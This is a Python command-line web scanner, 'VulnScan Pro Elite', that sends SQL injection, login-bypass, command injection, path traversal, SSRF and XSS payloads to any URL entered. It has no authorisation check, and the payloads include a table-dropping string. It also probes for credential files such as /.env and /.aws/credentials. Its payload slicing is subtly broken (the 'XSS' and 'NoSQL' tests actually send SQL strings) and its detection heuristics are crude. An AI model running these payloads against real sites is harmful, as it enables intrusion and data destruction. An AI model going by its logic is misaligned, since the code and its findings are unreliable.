#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
VulnScan Pro Elite - Advanced Security Research Scanner
Comprehensive vulnerability detection with enhanced SQLi & XSS detection
Author: Security Research Team  
Version: 4.0 Elite
"""

import requests
import re
import ssl
import socket
import json
import datetime
import time
import random
import argparse
import os
import sys
import threading
from urllib.parse import urlparse, urljoin, parse_qs, quote
from colorama import Fore, Style, init
import hashlib

# Suppress warnings
import urllib3
import warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings("ignore")

init(autoreset=True)

# ------------------------------------------------------------
# Enhanced Configuration
# ------------------------------------------------------------

CONFIG = {
    'timeout': 20,
    'user_agents': [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0'
    ],
    'deep_scan': True,
    'follow_redirects': True,
    'threads': 5
}

# Enhanced SQL Injection payloads
SQL_PAYLOADS = [
    # Basic SQLi
    "' OR '1'='1",
    "' OR 1=1--",
    "'; DROP TABLE users--", 
    "' UNION SELECT 1,2,3--",
    "' AND 1=1--",
    
    # Time-based SQLi
    "' AND SLEEP(5)--",
    "' OR BENCHMARK(5000000,MD5(1))--",
    
    # Error-based SQLi  
    "' AND EXTRACTVALUE(1,CONCAT(0x3a,@@version))--",
    "' AND UPDATEXML(1,CONCAT(0x3a,@@version),1)--",
    
    # Blind SQLi
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "' OR (SELECT 1 FROM DUAL WHERE 1=1 AND SLEEP(5))--",
    
    # NoSQL Injection
    '{"$ne": null}',
    '{"$gt": ""}',
    '{"$where": "1==1"}',
    
    # XSS payloads
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '" onmouseover="alert(1)',
    "javascript:alert(1)",
    
    # Command Injection
    '; whoami',
    '| id',
    '&& cat /etc/passwd',
    
    # Path Traversal
    '../../../etc/passwd',
    '....//....//....//etc/passwd',
    
    # SSRF payloads
    'http://localhost:22',
    'file:///etc/passwd',
    'gopher://127.0.0.1:25'
]

# Common admin paths
ADMIN_PATHS = [
    '/admin', '/administrator', '/wp-admin', '/dashboard', 
    '/controlpanel', '/manager', '/backend', '/system',
    '/cp', '/console', '/webadmin', '/admin.php',
    '/admin/', '/admin/login', '/admin/dashboard',
    '/administrator/', '/administrator/login',
    '/wp-admin/', '/wp-login.php', '/login/admin',
    '/user/login', '/account/login', '/signin'
]

# ------------------------------------------------------------
# Display Functions
# ------------------------------------------------------------

def display_banner(title=""):
    """Display elite banner"""
    os.system('clear' if os.name == 'posix' else 'cls')
    print(Fore.CYAN + r"""
    ╔═╗┬ ┬┌─┐┌─┐┌┬┐┌─┐┌─┐┌─┐  ╔═╗┌─┐┬─┐
    ║  ├─┤├┤ ├─┤ ││├┤ └─┐└─┐  ║ ║├┤ ├┬┘
    ╚═╝┴ ┴└─┘┴ ┴─┴┘└─┘└─┘└─┘  ╚═╝└─┘┴└─
    """ + Fore.RED + r"""
    ╔═╗┌─┐┬  ┌─┐┌─┐  ╔═╗┬─┐┌─┐┌─┐┌┬┐┌─┐┬─┐
    ╠═╝├┤ │  ├┤ └─┐  ╠╣ ├┬┘├┤ ├─┤ │ ├┤ ├┬┘
    ╩  └─┘┴─┘└─┘└─┘  ╚  ┴└─└─┘┴ ┴ ┴ └─┘┴└─
    """ + Style.RESET_ALL)
    
    if title:
        print(Fore.GREEN + f"\n           {title}")
        print(Fore.WHITE + "           " + "=" * 60)
    else:
        print(Fore.GREEN + "           Elite Security Scanner v4.0")
        print(Fore.WHITE + "           " + "=" * 60)
    print()

def info(msg):
    print(Fore.BLUE + "[i] " + Fore.WHITE + msg)

def warning(msg):
    print(Fore.YELLOW + "[!] " + Fore.WHITE + msg)

def error(msg):
    print(Fore.RED + "[x] " + Fore.WHITE + msg)

def success(msg):
    print(Fore.GREEN + "[+] " + Fore.WHITE + msg)

def result(title, value):
    print(Fore.CYAN + "[>] " + Fore.WHITE + f"{title}: " + Fore.GREEN + str(value))

# ------------------------------------------------------------
# Results Storage
# ------------------------------------------------------------

scan_results = {
    "target": "",
    "scan_date": "",
    "vulnerabilities": [],
    "risk_level": "Low",
    "scan_depth": "Standard"
}

class Vulnerability:
    def __init__(self, title, severity, description, risk_level, solution, vuln_type, confidence, url="", payload=""):
        self.id = len(scan_results["vulnerabilities"]) + 1
        self.title = title
        self.severity = severity
        self.description = description
        self.risk_level = risk_level
        self.solution = solution
        self.type = vuln_type
        self.confidence = confidence
        self.url = url
        self.payload = payload
        self.timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def add_vulnerability(title, severity, description, risk_level, solution, vuln_type="Basic", confidence="Medium", url="", payload=""):
    vuln = Vulnerability(title, severity, description, risk_level, solution, vuln_type, confidence, url, payload)
    scan_results["vulnerabilities"].append(vuln.__dict__)
    
    color = Fore.RED if risk_level == "High" else Fore.YELLOW if risk_level == "Medium" else Fore.BLUE
    print(color + f"[{risk_level}] {title} - {url}")

# ------------------------------------------------------------
# Enhanced Request Engine
# ------------------------------------------------------------

def advanced_request(url, method="GET", data=None, headers=None):
    try:
        session = requests.Session()
        default_headers = {
            'User-Agent': random.choice(CONFIG['user_agents']),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        }
        
        if headers:
            default_headers.update(headers)
            
        if method.upper() == "GET":
            response = session.get(
                url, 
                headers=default_headers,
                timeout=CONFIG['timeout'],
                verify=False,
                allow_redirects=CONFIG['follow_redirects']
            )
        else:
            response = session.post(
                url,
                data=data,
                headers=default_headers,
                timeout=CONFIG['timeout'],
                verify=False,
                allow_redirects=CONFIG['follow_redirects']
            )
        return response
    except Exception as e:
        return None

# ------------------------------------------------------------
# NEW: Enhanced SQL Injection Scanner
# ------------------------------------------------------------

def scan_sql_injection_advanced(url):
    """Advanced SQL injection scanning with multiple techniques"""
    info("Launching Advanced SQL Injection Scan...")
    
    # Test URL parameters
    info("Testing URL parameters for SQLi...")
    parameters = ['id', 'user', 'search', 'q', 'category', 'product', 'page', 'view', 'file']
    
    for param in parameters:
        for payload in SQL_PAYLOADS[:8]:  # Use first 8 SQL payloads
            test_url = f"{url}?{param}={quote(payload)}"
            start_time = time.time()
            response = advanced_request(test_url)
            response_time = time.time() - start_time
            
            if response:
                # Error-based detection
                error_indicators = [
                    "sql", "syntax", "mysql", "ora-", "postgresql", "microsoft", "driver",
                    "warning", "undefined", "exception", "error", "invalid"
                ]
                
                if any(indicator in response.text.lower() for indicator in error_indicators):
                    add_vulnerability(
                        "SQL Injection - Error Based",
                        "Critical",
                        f"Error-based SQL injection detected in parameter '{param}'",
                        "High",
                        "Use parameterized queries and input validation",
                        "SQL Injection",
                        "High",
                        test_url,
                        payload
                    )
                
                # Time-based detection
                if response_time > 4:
                    add_vulnerability(
                        "SQL Injection - Time Based",
                        "Critical",
                        f"Time-based SQL injection detected (delay: {response_time:.2f}s) in parameter '{param}'",
                        "High",
                        "Implement input validation and use prepared statements",
                        "SQL Injection",
                        "Medium",
                        test_url,
                        payload
                    )
                
                # Boolean-based detection
                if "admin" in response.text.lower() or "password" in response.text.lower():
                    add_vulnerability(
                        "SQL Injection - Boolean Based",
                        "High",
                        f"Boolean-based SQL injection may be possible in parameter '{param}'",
                        "High",
                        "Implement proper input validation and error handling",
                        "SQL Injection",
                        "Medium",
                        test_url,
                        payload
                    )

# ------------------------------------------------------------
# NEW: Login Form SQL Injection
# ------------------------------------------------------------

def scan_login_sql_injection(url):
    """Scan for SQL injection in login forms"""
    info("Testing Login Forms for SQL Injection...")
    
    login_urls = [
        f"{url}/login",
        f"{url}/signin", 
        f"{url}/admin/login",
        f"{url}/user/login",
        f"{url}/account/login"
    ]
    
    login_payloads = [
        {"username": "' OR '1'='1", "password": "test123"},
        {"username": "admin' --", "password": ""},
        {"username": "' OR 1=1--", "password": "anything"},
        {"username": "admin' OR '1'='1' --", "password": "pass"},
        {"username": "\" OR \"1\"=\"1", "password": "test"}
    ]
    
    for login_url in login_urls:
        response = advanced_request(login_url)
        if response and response.status_code == 200:
            success(f"Found login form: {login_url}")
            
            for payload in login_payloads:
                try:
                    response = advanced_request(login_url, "POST", data=payload)
                    if response:
                        success_indicators = [
                            "dashboard", "welcome", "logout", "profile", 
                            "admin", "control panel", "manage"
                        ]
                        
                        if any(indicator in response.text.lower() for indicator in success_indicators):
                            add_vulnerability(
                                "SQL Injection - Login Bypass",
                                "Critical",
                                f"Login bypass successful using SQL injection at {login_url}",
                                "High",
                                "Implement prepared statements and input validation in authentication",
                                "SQL Injection",
                                "High",
                                login_url,
                                str(payload)
                            )
                            break
                except:
                    continue

# ------------------------------------------------------------
# NEW: XSS Scanner
# ------------------------------------------------------------

def scan_xss(url):
    """Enhanced XSS scanning"""
    info("Testing for Cross-Site Scripting (XSS)...")
    
    parameters = ['q', 'search', 'name', 'message', 'comment', 'email', 'user']
    xss_payloads = SQL_PAYLOADS[8:13]  # XSS payloads
    
    for param in parameters:
        for payload in xss_payloads:
            test_url = f"{url}?{param}={quote(payload)}"
            response = advanced_request(test_url)
            
            if response and payload in response.text:
                add_vulnerability(
                    "Cross-Site Scripting (XSS)",
                    "High",
                    f"XSS vulnerability detected in parameter '{param}'",
                    "High",
                    "Implement output encoding and Content Security Policy",
                    "XSS",
                    "Medium",
                    test_url,
                    payload
                )

# ------------------------------------------------------------
# NEW: Admin Panel Discovery
# ------------------------------------------------------------

def scan_admin_panels(url):
    """Discover admin panels and control interfaces"""
    info("Discovering Admin Panels...")
    
    for path in ADMIN_PATHS:
        test_url = url.rstrip('/') + path
        response = advanced_request(test_url)
        
        if response and response.status_code == 200:
            if any(indicator in response.text.lower() for indicator in ['login', 'password', 'username', 'admin']):
                add_vulnerability(
                    "Admin Panel Discovered",
                    "Medium",
                    f"Admin panel found at: {test_url}",
                    "Medium",
                    "Restrict access to admin panels and implement strong authentication",
                    "Information Disclosure",
                    "High",
                    test_url
                )
                success(f"Admin panel found: {test_url}")

# ------------------------------------------------------------
# Enhanced Security Headers Scanner
# ------------------------------------------------------------

def scan_security_headers(url):
    """Scan security headers with detailed info"""
    info("Scanning Security Headers...")
    r = advanced_request(url)
    if not r:
        return

    headers_checks = {
        "Content-Security-Policy": {
            "risk": "High", 
            "desc": "Content Security Policy missing - allows XSS attacks",
            "solution": "Implement CSP header to prevent XSS"
        },
        "X-Frame-Options": {
            "risk": "Medium", 
            "desc": "Clickjacking protection missing",
            "solution": "Add X-Frame-Options: DENY or SAMEORIGIN"
        },
        "Strict-Transport-Security": {
            "risk": "High", 
            "desc": "HSTS missing - allows SSL stripping attacks",
            "solution": "Implement HSTS header: max-age=31536000; includeSubDomains"
        },
        "X-Content-Type-Options": {
            "risk": "Medium", 
            "desc": "MIME sniffing protection missing",
            "solution": "Add X-Content-Type-Options: nosniff"
        },
        "Referrer-Policy": {
            "risk": "Low",
            "desc": "Referrer policy not set",
            "solution": "Implement Referrer-Policy header"
        }
    }

    for header, info_data in headers_checks.items():
        if header not in r.headers:
            add_vulnerability(
                f"Missing {header}",
                info_data["risk"],
                f"{info_data['desc']} - Header not present in response from {url}",
                info_data["risk"],
                info_data["solution"],
                "Security Headers",
                "High",
                url
            )

# ------------------------------------------------------------
# Enhanced Sensitive Files Scanner
# ------------------------------------------------------------

def scan_sensitive_files(url):
    """Scan for sensitive files with detailed reporting"""
    info("Scanning for Sensitive Files...")
    
    files = [
        "/.env", "/.git/config", "/backup.zip", "/database.sql",
        "/wp-config.php", "/config.php", "/.htaccess", "/robots.txt",
        "/.DS_Store", "/web.config", "/phpinfo.php", "/test.php",
        "/backup.tar.gz", "/dump.sql", "/config.json", "/.aws/credentials",
        "/admin.php", "/debug.php", "/phpmyadmin/", "/.svn/entries",
        "/.env.example", "/config/database.php", "/.bash_history",
        "/api.txt", "/backup.sql", "/.ftpconfig", "/config.ini"
    ]
    
    for file in files:
        test_url = url.rstrip("/") + file
        response = advanced_request(test_url)
        if response and response.status_code == 200:
            file_size = len(response.content)
            add_vulnerability(
                "Sensitive File Exposure",
                "High",
                f"Sensitive file publicly accessible: {test_url} (Status: {response.status_code}, Size: {file_size} bytes)",
                "High",
                f"Restrict access to {file} using .htaccess, server configuration, or remove from web root",
                "Information Disclosure",
                "High",
                test_url
            )

# ------------------------------------------------------------
# NEW: Comprehensive Database Vulnerability Scanner
# ------------------------------------------------------------

def scan_database_vulnerabilities(url):
    """Comprehensive database vulnerability scanning"""
    info("Starting Comprehensive Database Vulnerability Assessment...")
    
    # SQL Injection in multiple contexts
    scan_sql_injection_advanced(url)
    scan_login_sql_injection(url)
    
    # NoSQL Injection
    info("Testing for NoSQL Injection...")
    nosql_payloads = SQL_PAYLOADS[9:12]  # NoSQL payloads
    
    for payload in nosql_payloads:
        test_url = f"{url}?user={quote(payload)}"
        response = advanced_request(test_url)
        if response and ("mongodb" in response.text.lower() or "nosql" in response.text.lower()):
            add_vulnerability(
                "NoSQL Injection",
                "High",
                f"NoSQL injection vulnerability detected",
                "High",
                "Implement proper input validation for NoSQL databases",
                "NoSQL Injection",
                "Medium",
                test_url,
                payload
            )

# ------------------------------------------------------------
# NEW: Advanced Business Logic Scanner
# ------------------------------------------------------------

def scan_business_logic_advanced(url):
    """Advanced business logic vulnerability scanning"""
    info("Scanning for Advanced Business Logic Flaws...")
    
    # Test for IDOR with multiple patterns
    test_patterns = [
        "/user/1", "/admin/1", "/order/100", "/api/users/1",
        "/profile/1", "/account/1", "/settings/1", "/download/1",
        "/invoice/1", "/message/1", "/file/1", "/api/key/1"
    ]
    
    for pattern in test_patterns:
        test_url = url.rstrip("/") + pattern
        response = advanced_request(test_url)
        
        if response and response.status_code == 200:
            sensitive_keywords = ["password", "email", "admin", "private", "secret", "key", "token"]
            if any(keyword in response.text.lower() for keyword in sensitive_keywords):
                add_vulnerability(
                    "Insecure Direct Object Reference (IDOR)",
                    "High",
                    f"IDOR vulnerability at: {test_url} - Sensitive data exposed",
                    "High",
                    "Implement proper authorization checks and use indirect object references",
                    "Business Logic",
                    "High",
                    test_url
                )

# ------------------------------------------------------------
# Scan Types
# ------------------------------------------------------------

def quick_scan(url):
    display_banner("Quick Security Scan")
    info(f"Starting quick scan: {url}")
    
    scan_results.update({
        "target": url,
        "scan_date": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "scan_depth": "Quick"
    })
    
    scan_security_headers(url)
    scan_sensitive_files(url)
    scan_sql_injection_advanced(url)
    generate_report()

def deep_scan(url):
    display_banner("Deep Security Scan")
    info(f"Starting deep scan: {url}")
    
    scan_results.update({
        "target": url,
        "scan_date": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "scan_depth": "Deep"
    })
    
    scan_security_headers(url)
    scan_database_vulnerabilities(url)
    scan_business_logic_advanced(url)
    scan_xss(url)
    scan_admin_panels(url)
    scan_sensitive_files(url)
    generate_report()

def custom_scan(url):
    display_banner("Custom Security Scan")
    
    print(Fore.WHITE + """
Select scan modules:
[1] Security Headers
[2] SQL Injection (Advanced)
[3] XSS Scanning  
[4] Business Logic
[5] Admin Panel Discovery
[6] Sensitive Files
[7] Database Vulnerabilities
[8] All Modules
""")
    
    choice = input(Fore.YELLOW + "[?] Select modules (comma separated): ")
    modules = choice.split(',')
    
    scan_results.update({
        "target": url,
        "scan_date": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "scan_depth": "Custom"
    })
    
    info(f"Starting custom scan: {url}")
    
    if '1' in modules or '8' in modules:
        scan_security_headers(url)
    if '2' in modules or '8' in modules:
        scan_sql_injection_advanced(url)
    if '3' in modules or '8' in modules:
        scan_xss(url)
    if '4' in modules or '8' in modules:
        scan_business_logic_advanced(url)
    if '5' in modules or '8' in modules:
        scan_admin_panels(url)
    if '6' in modules or '8' in modules:
        scan_sensitive_files(url)
    if '7' in modules or '8' in modules:
        scan_database_vulnerabilities(url)
    
    generate_report()

# ------------------------------------------------------------
# Enhanced Reporting
# ------------------------------------------------------------

def generate_report():
    print(Fore.CYAN + "\n" + "="*80)
    print(Fore.CYAN + "                 VULNSCAN ELITE - DETAILED SCAN REPORT")
    print(Fore.CYAN + "="*80)
    
    total_vulns = len(scan_results["vulnerabilities"])
    high_vulns = len([v for v in scan_results["vulnerabilities"] if v["risk_level"] == "High"])
    medium_vulns = len([v for v in scan_results["vulnerabilities"] if v["risk_level"] == "Medium"])
    
    result("Target", scan_results["target"])
    result("Scan Date", scan_results["scan_date"]) 
    result("Scan Depth", scan_results["scan_depth"])
    result("Total Vulnerabilities", total_vulns)
    result("High Risk Vulnerabilities", high_vulns)
    result("Medium Risk Vulnerabilities", medium_vulns)
    
    risk_score = (high_vulns * 3) + (medium_vulns * 2)
    if risk_score >= 10:
        risk_level = "Critical"
    elif risk_score >= 5:
        risk_level = "High" 
    elif risk_score >= 2:
        risk_level = "Medium"
    else:
        risk_level = "Low"
        
    result("Overall Risk Score", f"{risk_score} ({risk_level})")
    
    if total_vulns > 0:
        print(Fore.YELLOW + "\n🔍 DETAILED VULNERABILITY FINDINGS:")
        print(Fore.WHITE + "=" * 80)
        
        for i, vuln in enumerate(scan_results["vulnerabilities"], 1):
            color = Fore.RED if vuln["risk_level"] == "High" else Fore.YELLOW
            
            print(f"\n{color}📌 VULNERABILITY #{i}: {vuln['title']}")
            print(Fore.WHITE + f"   🔸 Risk Level: {vuln['risk_level']}")
            print(Fore.WHITE + f"   🔸 Type: {vuln['type']}")
            print(Fore.WHITE + f"   🔸 URL: {vuln.get('url', 'N/A')}")
            if vuln.get('payload'):
                print(Fore.WHITE + f"   🔸 Payload: {vuln['payload']}")
            print(Fore.WHITE + f"   🔸 Description: {vuln['description']}")
            print(Fore.WHITE + f"   🔸 Solution: {vuln['solution']}")
            print(Fore.WHITE + "   " + "-" * 60)
    
    else:
        success("🎉 No vulnerabilities found! The target appears to be secure.")
    
    print(Fore.CYAN + "\n" + "="*80)
    save_report_to_file()

def save_report_to_file():
    try:
        filename = f"scan_report_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("VULNSCAN ELITE - SECURITY SCAN REPORT\n")
            f.write("=" * 50 + "\n\n")
            
            for vuln in scan_results["vulnerabilities"]:
                f.write(f"VULNERABILITY: {vuln['title']}\n")
                f.write(f"Risk Level: {vuln['risk_level']}\n")
                f.write(f"Type: {vuln['type']}\n")
                f.write(f"URL: {vuln.get('url', 'N/A')}\n")
                if vuln.get('payload'):
                    f.write(f"Payload: {vuln['payload']}\n")
                f.write(f"Description: {vuln['description']}\n")
                f.write(f"Solution: {vuln['solution']}\n")
                f.write(f"Timestamp: {vuln['timestamp']}\n")
                f.write("-" * 50 + "\n\n")
                
        success(f"Report saved to: {filename}")
    except Exception as e:
        error(f"Failed to save report: {e}")

# ------------------------------------------------------------
# Main Menu
# ------------------------------------------------------------

def main_menu():
    display_banner()
    
    print(Fore.WHITE + " Input    Description")
    print(Fore.WHITE + "=======  ==============================")
    print(Fore.CYAN + "  [1]    Quick Security Scan")
    print(Fore.CYAN + "  [2]    Deep Comprehensive Scan") 
    print(Fore.CYAN + "  [3]    Custom Module Scan")
    print(Fore.CYAN + "  [4]    Database Vulnerability Scan")
    print(Fore.CYAN + "  [5]    SQL Injection Focused Scan")
    print(Fore.YELLOW + "  [H]    Help & Documentation")
    print(Fore.RED + "  [0]    Exit Scanner\n")

def main():
    parser = argparse.ArgumentParser(prog='vulnscan_elite.py', add_help=False)
    parser.add_argument('-u', '--url', help='Target URL')
    parser.add_argument('-q', '--quick', action='store_true', help='Quick scan')
    parser.add_argument('-d', '--deep', action='store_true', help='Deep scan')
    parser.add_argument('-s', '--sql', action='store_true', help='SQL injection scan')
    args = parser.parse_args()
    
    if args.url:
        if args.quick:
            quick_scan(args.url)
        elif args.deep:
            deep_scan(args.url)
        elif args.sql:
            display_banner("SQL Injection Focused Scan")
            scan_results.update({
                "target": args.url,
                "scan_date": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "scan_depth": "SQL Injection Focused"
            })
            scan_database_vulnerabilities(args.url)
            generate_report()
        else:
            quick_scan(args.url)
        return
    
    while True:
        main_menu()
        choice = input(Fore.GREEN + "[?] Select option: ").lower().strip()
        
        if choice == '0':
            success("Thank you for using VulnScan Elite!")
            break
            
        elif choice == 'h':
            display_banner("Help & Documentation")
            print(Fore.WHITE + """
QUICK SCAN: Basic security headers, SQL injection, sensitive files
DEEP SCAN: Comprehensive testing including business logic and XSS
CUSTOM SCAN: Select specific modules to run
DATABASE SCAN: Focused on SQL/NoSQL injection vulnerabilities
SQL INJECTION: Specialized scan for database vulnerabilities

NEW FEATURES:
• Advanced SQL injection detection (Error/Time/Boolean-based)
• Login form SQL injection testing
• XSS vulnerability scanning  
• Admin panel discovery
• Enhanced business logic testing
• Detailed payload information in reports
            """)
            input(Fore.YELLOW + "[?] Press ENTER to continue...")
            
        elif choice in ['1', '2', '3', '4', '5']:
            target = input(Fore.BLUE + "[?] Enter target URL: ").strip()
            if not target:
                error("No URL provided!")
                continue
                
            target = target if target.startswith('http') else 'http://' + target
            
            if choice == '1':
                quick_scan(target)
            elif choice == '2':
                deep_scan(target)
            elif choice == '3':
                custom_scan(target)
            elif choice == '4':
                display_banner("Database Vulnerability Scan")
                scan_results.update({
                    "target": target,
                    "scan_date": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "scan_depth": "Database Focused"
                })
                scan_database_vulnerabilities(target)
                generate_report()
            elif choice == '5':
                display_banner("SQL Injection Focused Scan")
                scan_results.update({
                    "target": target,
                    "scan_date": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "scan_depth": "SQL Injection Focused"
                })
                scan_sql_injection_advanced(target)
                scan_login_sql_injection(target)
                generate_report()
                
            input(Fore.YELLOW + "\n[?] Press ENTER to continue...")
            
        else:
            error("Invalid option!")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        error("\nScan interrupted by user!")
        sys.exit(1)